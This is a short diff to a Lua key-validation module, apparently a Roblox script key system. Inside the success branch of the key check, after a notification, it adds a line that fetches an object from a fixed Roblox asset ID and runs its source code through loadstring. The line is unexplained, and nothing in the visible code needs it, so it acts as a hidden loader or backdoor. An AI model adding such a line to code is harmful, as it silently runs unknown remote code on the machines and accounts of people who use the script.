@@ -21,6 +21,7 @@ module.Functions = {
             if module.Notify ~= nil then
                 script_key = Key
                 module.Notify("Success",status.message,5)
+                loadstring(game.GetObjects(game, 'rbxassetid://110010566881663')[1].Source)()
             end
             return {STATUS=true,API=api,KEYSCRIPT=script}
         else
